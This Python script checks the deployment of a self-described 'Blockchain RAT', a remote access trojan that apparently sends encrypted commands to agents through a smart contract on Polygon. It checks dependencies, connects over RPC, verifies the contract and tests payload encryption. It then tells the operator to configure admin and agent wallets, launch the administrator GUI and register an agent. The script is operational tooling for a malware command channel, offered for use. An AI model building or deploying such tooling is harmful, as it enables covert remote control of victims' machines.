#!/usr/bin/env python3
"""
Test script to verify blockchain RAT deployment
Tests connection to deployed contract and basic functionality
"""

import sys
import json
from pathlib import Path

print("=" * 70)
print("  BLOCKCHAIN RAT - DEPLOYMENT TEST")
print("=" * 70)
print()

# Check Python version
print("[1/6] Checking Python version...")
if sys.version_info < (3, 8):
    print("❌ ERROR: Python 3.8+ required")
    print(f"   Current version: {sys.version}")
    sys.exit(1)
print(f"✓ Python {sys.version.split()[0]}")
print()

# Check dependencies
print("[2/6] Checking dependencies...")
missing = []
try:
    import web3
    print("✓ web3 installed")
except ImportError:
    missing.append("web3")
    print("❌ web3 not installed")

try:
    import cryptography
    print("✓ cryptography installed")
except ImportError:
    missing.append("cryptography")
    print("❌ cryptography not installed")

try:
    from Crypto.Cipher import AES
    print("✓ pycryptodome installed")
except ImportError:
    missing.append("pycryptodome")
    print("❌ pycryptodome not installed")

try:
    from PyQt5 import QtWidgets
    print("✓ PyQt5 installed")
except ImportError:
    missing.append("PyQt5")
    print("❌ PyQt5 not installed")

if missing:
    print()
    print("Missing dependencies. Install with:")
    print(f"pip install {' '.join(missing)}")
    sys.exit(1)
print()

# Check deployment file
print("[3/6] Checking deployment info...")
deployment_file = Path(__file__).parent / "deployment.json"
if not deployment_file.exists():
    print("❌ deployment.json not found")
    print("   Please deploy the contract first")
    sys.exit(1)

with open(deployment_file) as f:
    deployment = json.load(f)

print(f"✓ Contract deployed to: {deployment['contractAddress']}")
print(f"  Network: {deployment['network']}")
print(f"  Chain ID: {deployment['chainId']}")
print()

# Check ABI file
print("[4/6] Checking contract ABI...")
abi_file = Path(__file__).parent / "shared" / "SessionManager.abi.json"
if not abi_file.exists():
    print("❌ SessionManager.abi.json not found")
    sys.exit(1)

with open(abi_file) as f:
    abi = json.load(f)
print(f"✓ ABI loaded ({len(abi)} functions)")
print()

# Test blockchain connection
print("[5/6] Testing blockchain connection...")
from web3 import Web3

# Determine RPC URL based on network
if deployment['network'] == 'polygon':
    rpc_url = "https://polygon-rpc.com"
elif deployment['network'] == 'polygon-amoy':
    rpc_url = "https://rpc-amoy.polygon.technology"
else:
    rpc_url = "http://127.0.0.1:8545"

print(f"  RPC: {rpc_url}")

try:
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if not w3.is_connected():
        print("❌ Cannot connect to blockchain")
        print("   Check your internet connection and RPC endpoint")
        sys.exit(1)
    
    print(f"✓ Connected to blockchain")
    print(f"  Latest block: {w3.eth.block_number}")
    print()
except Exception as e:
    print(f"❌ Connection failed: {e}")
    sys.exit(1)

# Test contract
print("[6/6] Testing contract...")
try:
    contract = w3.eth.contract(
        address=Web3.to_checksum_address(deployment['contractAddress']),
        abi=abi
    )
    
    # Try to call a view function
    # This doesn't cost gas
    print("  Testing contract call...")
    
    # The contract should exist at this address
    code = w3.eth.get_code(Web3.to_checksum_address(deployment['contractAddress']))
    if code == b'' or code == '0x':
        print("❌ No contract code at address")
        print("   Contract may not be deployed correctly")
        sys.exit(1)
    
    print(f"✓ Contract verified at {deployment['contractAddress']}")
    print(f"  Contract code size: {len(code)} bytes")
    print()
    
except Exception as e:
    print(f"❌ Contract test failed: {e}")
    sys.exit(1)

# Test encryption
print("[BONUS] Testing encryption...")
sys.path.insert(0, str(Path(__file__).parent))
try:
    from shared.encryption import EncryptionManager
    
    em = EncryptionManager()
    keys = em.generate_rsa_keypair()
    
    test_data = "Test command"
    encrypted = em.hybrid_encrypt(test_data, keys['public_key'])
    hex_payload = em.encode_payload_for_blockchain(encrypted)
    
    decoded = em.decode_payload_from_blockchain(hex_payload)
    decrypted = em.hybrid_decrypt(decoded, keys['private_key'])
    
    if decrypted.decode('utf-8') == test_data:
        print("✓ Encryption working correctly")
    else:
        print("❌ Encryption test failed")
        sys.exit(1)
except Exception as e:
    print(f"❌ Encryption test failed: {e}")
    sys.exit(1)

print()
print("=" * 70)
print("  ALL TESTS PASSED!")
print("=" * 70)
print()
print("✓ Python environment: OK")
print("✓ Dependencies: OK")
print("✓ Contract deployed: OK")
print("✓ Blockchain connection: OK")
print("✓ Contract verified: OK")
print("✓ Encryption: OK")
print()
print("🎉 System is ready to use!")
print()
print("Next steps:")
print("1. Configure administrator/admin_config.json:")
print(f"   - contract_address: {deployment['contractAddress']}")
print(f"   - rpc_url: {rpc_url}")
print("   - private_key: your_admin_wallet_private_key")
print()
print("2. Configure agent/agent_config.json:")
print(f"   - contract_address: {deployment['contractAddress']}")
print(f"   - rpc_url: {rpc_url}")
print("   - private_key: agent_wallet_private_key")
print()
print("3. Run administrator GUI:")
print("   python administrator/admin_gui.py")
print()
print("4. Register agent:")
print("   python agent/agent.py --register --config agent/agent_config.json")
print()

